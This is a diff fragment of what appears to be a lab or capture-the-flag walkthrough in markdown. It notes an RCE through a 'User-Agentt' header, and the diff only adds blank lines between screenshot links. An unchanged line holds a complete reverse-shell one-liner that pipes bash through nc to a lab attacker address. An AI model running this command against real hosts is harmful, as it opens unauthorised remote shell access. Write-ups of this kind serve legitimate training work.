@@ -69,12 +69,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 - Google reveals `RCE` in `User-Agentt`
 
 [](./images/3.png)
+
 [](./images/4.png)
 
 - Let's get reverse shell
   - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.2 7777 >/tmp/f`
 
 [](./images/5.png)
+
 [](./images/6.png)
 
 
